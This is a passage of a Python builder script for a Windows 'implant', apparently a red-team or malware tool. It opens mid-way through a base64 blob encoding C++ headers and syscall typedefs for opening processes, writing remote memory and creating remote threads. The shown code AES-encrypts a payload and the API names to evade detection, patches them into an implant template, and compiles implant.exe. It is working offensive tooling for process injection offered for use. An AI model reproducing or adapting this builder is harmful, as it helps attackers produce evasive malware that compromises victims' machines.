JWkVfVAkJCQkJZ2xSZXNlcnZlZDFbMjldOwoJUFZPSUQJCQkJCWdsUmVzZXJ2ZWQyOwoJUFZPSUQJCQkJCWdsU2VjdGlvbkluZm87CglQVk9JRAkJCQkJZ2xTZWN0aW9uOwoJUFZPSUQJCQkJCWdsVGFibGU7CglQVk9JRAkJCQkJZ2xDdXJyZW50UkM7CglQVk9JRAkJCQkJZ2xDb250ZXh0OwoJTlRTVEFUVVMgICAgICAgICAgICAgICAgTGFzdFN0YXR1c1ZhbHVlOwoJVU5JQ09ERV9TVFJJTkcJCQlTdGF0aWNVbmljb2RlU3RyaW5nOwoJV0NIQVIgICAgICAgICAgICAgICAgICAgU3RhdGljVW5pY29kZUJ1ZmZlclsyNjFdOwoJUFZPSUQJCQkJCURlYWxsb2NhdGlvblN0YWNrOwoJUFZPSUQJCQkJCVRsc1Nsb3RzWzY0XTsKCUxJU1RfRU5UUlkJCQkJVGxzTGlua3M7CglQVk9JRAkJCQkJVmRtOwoJUFZPSUQJCQkJCVJlc2VydmVkRm9yTnRScGM7CglQVk9JRAkJCQkJRGJnU3NSZXNlcnZlZFsyXTsKI2lmIChOVERESV9WRVJTSU9OID49IE5URERJX1dTMDMpCglVTE9ORyAgICAgICAgICAgICAgICAgICBIYXJkRXJyb3JNb2RlOwojZWxzZQoJVUxPTkcgICAgICAgICAgICAgICAgICBIYXJkRXJyb3JzQXJlRGlzYWJsZWQ7CiNlbmRpZgojaWYgKE5URERJX1ZFUlNJT04gPj0gTlRERElfTE9OR0hPUk4pCglQVk9JRAkJCQkJSW5zdHJ1bWVudGF0aW9uWzEzIC0gc2l6ZW9mKEdVSUQpIC8gc2l6ZW9mKFBWT0lEKV07CglHVUlEICAgICAgICAgICAgICAgICAgICBBY3Rpdml0eUlkOwoJUFZPSUQJCQkJCVN1YlByb2Nlc3NUYWc7CglQVk9JRAkJCQkJRXR3TG9jYWxEYXRhOwoJUFZPSUQJCQkJCUV0d1RyYWNlRGF0YTsKI2VsaWYgKE5URERJX1ZFUlNJT04gPj0gTlRERElfV1MwMykKCVBWT0lECQkJCQlJbnN0cnVtZW50YXRpb25bMTRdOwoJUFZPSUQJCQkJCVN1YlByb2Nlc3NUYWc7CglQVk9JRAkJCQkJRXR3TG9jYWxEYXRhOwojZWxzZQoJUFZPSUQJCQkJCUluc3RydW1lbnRhdGlvblsxNl07CiNlbmRpZgoJUFZPSUQJCQkJCVdpblNvY2tEYXRhOwoJVUxPTkcJCQkJCUdkaUJhdGNoQ291bnQ7CiNpZiAoTlRERElfVkVSU0lPTiA+PSBOVERESV9MT05HSE9STikKCUJPT0xFQU4gICAgICAgICAgICAgICAgU3BhcmVCb29sMDsKCUJPT0xFQU4gICAgICAgICAgICAgICAgU3BhcmVCb29sMTsKCUJPT0xFQU4gICAgICAgICAgICAgICAgU3BhcmVCb29sMjsKI2Vsc2UKCUJPT0xFQU4gICAgICAgICAgICAgICAgSW5EYmdQcmludDsKCUJPT0xFQU4gICAgICAgICAgICAgICAgRnJlZVN0YWNrT25UZXJtaW5hdGlvbjsKCUJPT0xFQU4gICAgICAgICAgICAgICAgSGFzRmliZXJEYXRhOwojZW5kaWYKCVVDSEFSICAgICAgICAgICAgICAgICAgSWRlYWxQcm9jZXNzb3I7CiNpZiAoTlRERElfVkVSU0lPTiA+PSBOVERESV9XUzAzKQoJVUxPTkcgICAgICAgICAgICAgICAgICBHdWFyYW50ZWVkU3RhY2tCeXRlczsKI2Vsc2UKCVVMT05HICAgICAgICAgICAgICAgICAgU3BhcmUzOwojZW5kaWYKCVBWT0lECQkJCSAgIFJlc2VydmVkRm9yUGVyZjsKCVBWT0lECQkJCSAgIFJlc2VydmVkRm9yT2xlOwoJVUxPTkcgICAgICAgICAgICAgICAgICBXYWl0aW5nT25Mb2FkZXJMb2NrOwojaWYgKE5URERJX1ZFUlNJT04gPj0gTlRERElfTE9OR0hPUk4pCglQVk9JRAkJCQkgICBTYXZlZFByaW9yaXR5U3RhdGU7CglVTE9OR19QVFIJCQkgICBTb2Z0UGF0Y2hQdHIxOwoJVUxPTkdfUFRSCQkJICAgVGhyZWFkUG9vbERhdGE7CiNlbGlmIChOVERESV9WRVJTSU9OID49IE5URERJX1dTMDMpCglVTE9OR19QVFIJCQkgICBTcGFyZVBvaW50ZXIxOwoJVUxPTkdfUFRSICAgICAgICAgICAgICBTb2Z0UGF0Y2hQdHIxOwoJVUxPTkdfUFRSICAgICAgICAgICAgICBTb2Z0UGF0Y2hQdHIyOwojZWxzZQoJV3g4NlRocmVhZFN0YXRlICAgICAgICBXeDg2VGhyZWFkOwojZW5kaWYKCVBWT0lEKiBUbHNFeHBhbnNpb25TbG90czsKI2lmIGRlZmluZWQoX1dJTjY0KSAmJiAhZGVmaW5lZChFWFBMSUNJVF8zMkJJVCkKCVBWT0lEICAgICAgICAgICAgICAgICAgRGVhbGxvY2F0aW9uQlN0b3JlOwoJUFZPSUQgICAgICAgICAgICAgICAgICBCU3RvcmVMaW1pdDsKI2VuZGlmCglVTE9ORyAgICAgICAgICAgICAgICAgIEltcGVyc29uYXRpb25Mb2NhbGU7CglVTE9ORyAgICAgICAgICAgICAgICAgIElzSW1wZXJzb25hdGluZzsKCVBWT0lEICAgICAgICAgICAgICAgICAgTmxzQ2FjaGU7CglQVk9JRCAgICAgICAgICAgICAgICAgIHBTaGltRGF0YTsKCVVMT05HICAgICAgICAgICAgICAgICAgSGVhcFZpcnR1YWxBZmZpbml0eTsKCUhBTkRMRSAgICAgICAgICAgICAgICAgQ3VycmVudFRyYW5zYWN0aW9uSGFuZGxlOwoJUFRFQl9BQ1RJVkVfRlJBTUUgICAgICBBY3RpdmVGcmFtZTsKI2lmIChOVERESV9WRVJTSU9OID49IE5URERJX1dTMDMpCglQVk9JRCBGbHNEYXRhOwojZW5kaWYKI2lmIChOVERESV9WRVJTSU9OID49IE5URERJX0xPTkdIT1JOKQoJUFZPSUQgUHJlZmVycmVkTGFuZ2F1Z2VzOwoJUFZPSUQgVXNlclByZWZMYW5ndWFnZXM7CglQVk9JRCBNZXJnZWRQcmVmTGFuZ3VhZ2VzOwoJVUxPTkcgTXVpSW1wZXJzb25hdGlvbjsKCXVuaW9uCgl7CgkJc3RydWN0CgkJewoJCQlVU0hPUlQgU3BhcmVDcm9zc1RlYkZsYWdzIDogMTY7CgkJfTsKCQlVU0hPUlQgQ3Jvc3NUZWJGbGFnczsKCX07Cgl1bmlvbgoJewoJCXN0cnVjdAoJCXsKCQkJVVNIT1JUIERiZ1NhZmVUaHVua0NhbGwgOiAxOwoJCQlVU0hPUlQgRGJnSW5EZWJ1Z1ByaW50IDogMTsKCQkJVVNIT1JUIERiZ0hhc0ZpYmVyRGF0YSA6IDE7CgkJCVVTSE9SVCBEYmdTa2lwVGhyZWFkQXR0YWNoIDogMTsKCQkJVVNIT1JUIERiZ1dlckluU2hpcEFzc2VydENvZGUgOiAxOwoJCQlVU0hPUlQgRGJnSXNzdWVkSW5pdGlhbEJwIDogMTsKCQkJVVNIT1JUIERiZ0Nsb25lZFRocmVhZCA6IDE7CgkJCVVTSE9SVCBTcGFyZVNhbWVUZWJCaXRzIDogOTsKCQl9OwoJCVVTSE9SVCBTYW1lVGViRmxhZ3M7Cgl9OwoJUFZPSUQgVHhuU2NvcGVFbnRlcmNhbGxiYWNrOwoJUFZPSUQgVHhuU2NvcGVFeGl0Q0FsbGJhY2s7CglQVk9JRCBUeG5TY29wZUNvbnRleHQ7CglVTE9ORyBMb2NrQ291bnQ7CglVTE9ORyBQcm9jZXNzUnVuZG93bjsKCVVMT05HNjQgTGFzdFN3aXRjaFRpbWU7CglVTE9ORzY0IFRvdGFsU3dpdGNoT3V0VGltZTsKCUxBUkdFX0lOVEVHRVIgV2FpdFJlYXNvbkJpdE1hcDsKI2Vsc2UKCUJPT0xFQU4gU2FmZVRodW5rQ2FsbDsKCUJPT0xFQU4gQm9vbGVhblNwYXJlWzNdOwojZW5kaWYKfSBURUIsICogUFRFQjsKCnR5cGVkZWYgc3RydWN0IF9MRFJfREFUQV9UQUJMRV9FTlRSWSB7CglMSVNUX0VOVFJZIEluTG9hZE9yZGVyTGlua3M7CglMSVNUX0VOVFJZIEluTWVtb3J5T3JkZXJMaW5rczsKCUxJU1RfRU5UUlkgSW5Jbml0aWFsaXphdGlvbk9yZGVyTGlua3M7CglQVk9JRCBEbGxCYXNlOwoJUFZPSUQgRW50cnlQb2ludDsKCVVMT05HIFNpemVPZkltYWdlOwoJVU5JQ09ERV9TVFJJTkcgRnVsbERsbE5hbWU7CglVTklDT0RFX1NUUklORyBCYXNlRGxsTmFtZTsKCVVMT05HIEZsYWdzOwoJV09SRCBMb2FkQ291bnQ7CglXT1JEIFRsc0luZGV4OwoJdW5pb24gewoJCUxJU1RfRU5UUlkgSGFzaExpbmtzOwoJCXN0cnVjdCB7CgkJCVBWT0lEIFNlY3Rpb25Qb2ludGVyOwoJCQlVTE9ORyBDaGVja1N1bTsKCQl9OwoJfTsKCXVuaW9uIHsKCQlVTE9ORyBUaW1lRGF0ZVN0YW1wOwoJCVBWT0lEIExvYWRlZEltcG9ydHM7Cgl9OwoJUEFDVElWQVRJT05fQ09OVEVYVCBFbnRyeVBvaW50QWN0aXZhdGlvbkNvbnRleHQ7CglQVk9JRCBQYXRjaEluZm9ybWF0aW9uOwoJTElTVF9FTlRSWSBGb3J3YXJkZXJMaW5rczsKCUxJU1RfRU5UUlkgU2VydmljZVRhZ0xpbmtzOwoJTElTVF9FTlRSWSBTdGF0aWNMaW5rczsKfSBMRFJfREFUQV9UQUJMRV9FTlRSWSwgKiBQTERSX0RBVEFfVEFCTEVfRU5UUlk7CgoKCnR5cGVkZWYgc3RydWN0IF9JTklUSUFMX1RFQiB7CglQVk9JRCAgICAgICAgICAgICAgICBTdGFja0Jhc2U7CglQVk9JRCAgICAgICAgICAgICAgICBTdGFja0xpbWl0OwoJUFZPSUQgICAgICAgICAgICAgICAgU3RhY2tDb21taXQ7CglQVk9JRCAgICAgICAgICAgICAgICBTdGFja0NvbW1pdE1heDsKCVBWT0lEICAgICAgICAgICAgICAgIFN0YWNrUmVzZXJ2ZWQ7Cn0gSU5JVElBTF9URUIsICogUElOSVRJQUxfVEVCOwoKCgoKdHlwZWRlZiBzdHJ1Y3QgX1VOSUNPREVfU1RSSU5HIHsKCVVTSE9SVCBMZW5ndGg7CglVU0hPUlQgTWF4aW11bUxlbmd0aDsKCVBXQ0ggIEJ1ZmZlcjsKfSBfVU5JQ09ERV9TVFJJTkcsICogX1BVTklDT0RFX1NUUklORzsKCnR5cGVkZWYgc3RydWN0IE9CSkVDVF9BVFRSSUJVVEVTCnsKCVVMT05HICAgICAgICAgICBMZW5ndGg7CglIQU5ETEUgICAgICAgICAgUm9vdERpcmVjdG9yeTsKCV9QVU5JQ09ERV9TVFJJTkcgT2JqZWN0TmFtZTsKCVVMT05HICAgICAgICAgICBBdHRyaWJ1dGVzOwoJUFZPSUQgICAgICAgICAgIFNlY3VyaXR5RGVzY3JpcHRvcjsKCVBWT0lEICAgICAgICAgICBTZWN1cml0eVF1YWxpdHlPZlNlcnZpY2U7Cn0gT0JKRUNUX0FUVFJJQlVURVMsICogUE9CSkVDVF9BVFRSSUJVVEVTOwoKI2RlZmluZSBJbml0aWFsaXplT2JqZWN0QXR0cmlidXRlcyhwdHIsIHJvb3QsIGF0dHJpYiwgbmFtZSwgZGVzYywgcW9zKSB7IChwdHIpLT5MZW5ndGggPSBzaXplb2YoT0JKRUNUX0FUVFJJQlVURVMpOyAgKHB0ciktPlJvb3REaXJlY3RvcnkgPSByb290OyAocHRyKS0+QXR0cmlidXRlcyA9IGF0dHJpYjsgKHB0ciktPk9iamVjdE5hbWUgPSBuYW1lOyAocHRyKS0+U2VjdXJpdHlEZXNjcmlwdG9yID0gZGVzYzsgKHB0ciktPlNlY3VyaXR5UXVhbGl0eU9mU2VydmljZSA9IHFvczsgfQoKCgovLyBPdXIgQ3VzdG9tIFN5c2NhbGxzCgp1c2luZyBNeU50T3BlblByb2Nlc3MgPSBOVFNUQVRVUyhOVEFQSSopKAoJT1VUIFBIQU5ETEUgUHJvY2Vzc0hhbmRsZSwKCUlOIEFDQ0VTU19NQVNLIERlc2lyZWRBY2Nlc3MsCglJTiBQT0JKRUNUX0FUVFJJQlVURVMgT2JqZWN0QXR0cmlidXRlcywKCUlOIFBDTElFTlRfSUQgQ2xpZW50SWQgT1BUSU9OQUwKCSk7Cgp1c2luZyBNeU50QWxsb2NhdGVWaXJ0dWFsTWVtb3J5ID0gTlRTVEFUVVMoTlRBUEkqKSAoCglJTiBIQU5ETEUgUHJvY2Vzc0hhbmRsZSwKCUlOIE9VVCBQVk9JRCBCYXNlQWRkcmVzcywKCUlOIFVMT05HIFplcm9CaXRzLAoJSU4gT1VUIFBTSVpFX1QgUmVnaW9uU2l6ZSwKCUlOIFVMT05HIEFsbG9jYXRpb25UeXBlLAoJSU4gVUxPTkcgUHJvdGVjdAoJKTsKCnVzaW5nIE15TnRXcml0ZVZpcnR1YWxNZW1vcnkgPSBOVFNUQVRVUyhOVEFQSSopKAoJSU4gSEFORExFIGhQcm9jZXNzLAoJSU4gUFZPSUQgbHBCYXNlQWRkcmVzcywKCUlOIFBWT0lEIGxwQnVmZmVyLAoJSU4gU0laRV9UIE51bWJlck9mQnl0ZXNUb1dyaXRlLAoJT1VUIFBTSVpFX1QgTnVtYmVyT2ZCeXRlc1dyaXR0ZW4KCSk7Cgp1c2luZyBNeU50UHJvdGVjdFZpcnR1YWxNZW1vcnkgPSBOVFNUQVRVUyhOVEFQSSopKAoJSU4gSEFORExFIFByb2Nlc3NIYW5kbGUsCglJTiBQVk9JRCogQmFzZUFkZHJlc3MsCglJTiBTSVpFX1QqIE51bWJlck9mQnl0ZXNUb1Byb3RlY3QsCglJTiBVTE9ORyBOZXdBY2Nlc3NQcm90ZWN0aW9uLAoJT1VUIFBVTE9ORyBPbGRBY2Nlc3NQcm90ZWN0aW9uCgkpOwoKdXNpbmcgTXlOdENyZWF0ZVRocmVhZEV4ID0gTlRTVEFUVVMoTlRBUEkqKSgKCU9VVCBQSEFORExFICAgICAgICAgICAgICAgaFRocmVhZCwKCUlOIEFDQ0VTU19NQVNLICAgICAgICAgICAgRGVzaXJlZEFjY2VzcywKCUlOIFBWT0lEICAgICAgICAgICAgICAgICBPYmplY3RBdHRyaWJ1dGVzLAoJSU4gSEFORExFICAgICAgICAgICAgICAgICBQcm9jZXNzSGFuZGxlLAoJSU4gUFZPSUQJCQkJIGxwU3RhcnRBZGRyZXNzLAoJSU4gUFZPSUQgICAgICAgICAgICAgICAgIGxwUGFyYW1ldGVyLAoJSU4gQk9PTCAgICAgICAgICAgICAgICAgICBDcmVhdGVTdXNwZW5kZWQsCglJTiBTSVpFX1QgICAgICAgICAgICAgICAgICBTdGFja1plcm9CaXRzLAoJSU4gU0laRV9UICAgICAgICAgICAgICAgICAgU2l6ZU9mU3RhY2tDb21taXQsCglJTiBTSVpFX1QgICAgICAgICAgICAgICAgICBTaXplT2ZTdGFja1Jlc2VydmUsCglPVVQgUFZPSUQgICAgICAgICAgICAgICAgbHBCeXRlc0J1ZmZlcgoJKTs="

	# Make directory structure and write source files
	if not os.path.exists("src"):
		os.mkdir("src")
	else:
		print("[*] Clearing src folder to avoid compilation issues...")
		folder = 'src\\'
		for filename in os.listdir(folder):
		    file_path = os.path.join(folder, filename)
		    try:
		        if os.path.isfile(file_path) or os.path.islink(file_path):
		            os.unlink(file_path)
		        elif os.path.isdir(file_path):
		            shutil.rmtree(file_path)
		    except Exception as e:
		        print('Failed to delete %s. Reason: %s' % (file_path, e))

	with open("src\\compile.bat", "w") as f:
		f.write(b64.b64decode(b64_compile_bat).decode())

	with open("src\\helpers.cpp", "w") as f:
		f.write(b64.b64decode(b64_helpers_cpp).decode())

	with open("src\\helpers.h", "w") as f:
		f.write(b64.b64decode(b64_helpers_h).decode())

	with open("src\\PEstructs.h", "w") as f:
		f.write(b64.b64decode(b64_pestructs_h).decode())

	with open("src\\structs.h", "w") as f:
		f.write(b64.b64decode(b64_structs_h).decode())
	
	# Get initial content of implant-template.cpp file
	implant_text = b64.b64decode(b64_implant_template_cpp)


	# Generate encoded versions of payload and function names
	print("[*] Generating encoded payload and strings...\n")

	enc_payload = aesenc(payload_text, KEY)
	enc_NtOpenProc = aesenc(bytes((NtOpenProc+"\x00").encode()), KEY)
	enc_NtAllocVirtMem = aesenc(bytes((NtAllocVirtMem+"\x00").encode()), KEY)
	enc_NtWriteVirtMem = aesenc(bytes((NtWriteVirtMem+"\x00").encode()), KEY)
	enc_NtProtVirtMem = aesenc(bytes((NtProtVirtMem+"\x00").encode()), KEY)
	enc_NtCreateThrEx = aesenc(bytes((NtCreateThrEx+"\x00").encode()), KEY)

	# Update format of each to match what is needed in source file
	print("[*] Formating encoded strings to fit into C++ source file...\n")

	formatted_key = '{ 0x' + ', 0x'.join(format(x, '02x') for x in KEY) + ' };'
	formatted_payload = '{ 0x' + ', 0x'.join(format(x, '02x') for x in enc_payload) + ' };'
	formatted_NtOpenProc = '{ 0x' + ', 0x'.join(format(x, '02x') for x in enc_NtOpenProc) + ' };'
	formatted_NtAllocVirtMem = '{ 0x' + ', 0x'.join(format(x, '02x') for x in enc_NtAllocVirtMem) + ' };'
	formatted_NtWriteVirtMem = '{ 0x' + ', 0x'.join(format(x, '02x') for x in enc_NtWriteVirtMem) + ' };'
	formatted_NtProtVirtMem = '{ 0x' + ', 0x'.join(format(x, '02x') for x in enc_NtProtVirtMem) + ' };'
	formatted_NtCreateThrEx = '{ 0x' + ', 0x'.join(format(x, '02x') for x in enc_NtCreateThrEx) + ' };'

	# Replace the placeholders in implant.cpp with the encoded byte arrays
	print("[*] Replacing placeholders in implant.cpp with encrypted and formatted payloads...\n")

	implant_text = replace_text(implant_text, formatted_key, "[AESKEY]")
	implant_text = replace_text(implant_text, formatted_payload, "[ENCODED_PAYLOAD]")
	implant_text = replace_text(implant_text, formatted_NtOpenProc, "[ENCODED_NTOPENPROC]")
	implant_text = replace_text(implant_text, formatted_NtAllocVirtMem, "[ENCODED_NTALLOCVIRTMEM]")
	implant_text = replace_text(implant_text, formatted_NtWriteVirtMem, "[ENCODED_NTWRITEVIRTMEM]")
	implant_text = replace_text(implant_text, formatted_NtProtVirtMem, "[ENCODED_NTPROTVIRTMEM]")
	implant_text = replace_text(implant_text, formatted_NtCreateThrEx, "[ENCODED_NTCREATETHREX]")
	
	# Write updated text to implant.cpp file
	print("[*] Writing updated text to implant.cpp...\n")
	
	with open("src\\implant.cpp", "w") as f:
		f.write(implant_text.decode('utf-8'))
		
	
	# Compile C++ file with provided compile.bat script
	print("[*] Compiling implant.cpp with provided compile.bat file...\n")
	
	subprocess.check_output("src\\compile.bat", stderr=subprocess.STDOUT, shell=True)
	
	
	print("[+] Check the current directory for the new 'implant.exe' file.")


if __name__ == "__main__":
	main()